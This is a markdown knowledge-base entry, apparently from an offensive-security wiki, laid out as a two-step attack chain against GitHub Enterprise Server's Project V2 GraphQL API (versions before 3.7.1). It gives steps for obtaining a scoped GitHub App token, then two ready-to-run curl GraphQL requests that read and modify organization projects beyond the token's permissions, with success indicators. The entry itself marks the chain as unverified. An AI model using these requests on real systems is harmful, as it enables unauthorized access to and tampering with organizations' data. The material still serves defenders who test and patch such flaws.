---
tags:
  - github
  - graphql
  - privilege-escalation
  - authorization-bypass
  - improper-access-control
type: attack_chain
tools: []
tactics:
  - '[[Privilege Escalation]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-GitHub-Project-V2-API-Authorization-Bypass]]'
step_count: 2
techniques:
  - '[[Exploitation for Privilege Escalation]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:48.544Z'
description: >-
  An attack chain exploiting improper authorization in GitHub Enterprise
  Server's Project V2 GraphQL API, allowing GitHub Apps with scoped tokens to
  access and modify organization-level resources beyond their permissions.
skill_level: intermediate
impact_level: high
id: d8326329-ef8f-4763-bc50-421afc3ceb80
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
  - '[[Exploit Public-Facing Application]]'
---
# Privilege Escalation via Scoped-User-To-Server Tokens in GitHub Project V2 GraphQL API

Multi-stage attack chain demonstrating exploitation of an incorrect authorization vulnerability in GitHub Enterprise Server, enabling privilege escalation through crafted GraphQL requests to the Project V2 API.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Token Acquisition] --> B[GraphQL Exploitation]
    B --> C[Resource Access and Modification]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- None (uses standard HTTP clients like curl)

### Target Environment

- GitHub Enterprise Server (versions prior to 3.7.1)
- Required services/ports: GraphQL API endpoint (typically port 443 for HTTPS)
- Network access requirements: Valid access to the GitHub Enterprise instance

### Initial Access Requirements

- Credential requirements: A GitHub App installed with Scoped-User-To-Server Token permissions (e.g., read access to user projects)
- Network position: Direct API access to the GitHub Enterprise Server
- Prior access needed: Ability to create or use an existing GitHub App with limited scopes

## Detailed Attack Procedures

### Step 1: Acquire Scoped-User-To-Server Token

**Objective**: Obtain a valid token from a GitHub App with limited scopes, such as read access to user-specific projects, to use in subsequent API calls.

**Instructions**: Create or use an existing GitHub App in the target organization. Install the app for a user and generate a Scoped-User-To-Server Token via the app's installation settings. This token should have scopes limited to repository or user-level resources, not organization-wide.

**Expected Output**: A token string (e.g., ghs_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx) that can be used in Authorization headers.

**Success Indicators**:
- Token generated successfully
- Token validates against basic API endpoints (e.g., user profile query)

### Step 2: Exploit Authorization Bypass in Project V2 GraphQL API

procedure: [[procedures/Exploit-GitHub-Project-V2-API-Authorization-Bypass]]

**Objective**: Craft and execute GraphQL requests using the scoped token to access and potentially modify organization-level resources, such as projects and users, bypassing intended permission scopes.

**Instructions**: Use the acquired token to send a GraphQL mutation or query targeting organization projects via the Project V2 API. For example, query an organization project not tied to the app's repositories:

Execute [[commands/send-graphql-query-with-token]] to test read access:

```bash
curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"query": "query { organization(login: \"target-org\") { projectV2(number: 1) { title viewers(first: 10) { nodes { login } } } } }"}' https://github.enterprise.com/api/graphql
```

If successful, extend to write operations, such as adding items to the project:

```bash
curl -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"query": "mutation { addProjectV2ItemById(input: {projectId: \"PROJECT_ID\", contentId: \"ISSUE_ID\"}) { projectItem { id } } }"}' https://github.enterprise.com/api/graphql
```

Replace $TOKEN with the acquired token, target-org with the organization name, and IDs with actual values obtained from initial queries.

**Expected Output**: JSON response containing organization project details or successful mutation acknowledgment, indicating unauthorized access.

**Success Indicators**:
- Response includes data from organization-level resources (e.g., project viewers or users)
- No permission errors; successful read/write on non-repository resources

## Attack Chain Summary

### Key Achievements

1. Bypassed scoped permissions to read sensitive organization data like user lists in projects
2. Enabled modification of organization-wide projects, potentially allowing data tampering
3. Demonstrated impact on GitHub Enterprise Server versions before 3.7.1, with no effect on repository-specific resources

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploitation for Privilege Escalation]]
- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Privilege Escalation]]

---
*Last updated: 2023-10-01T00:00:00Z*
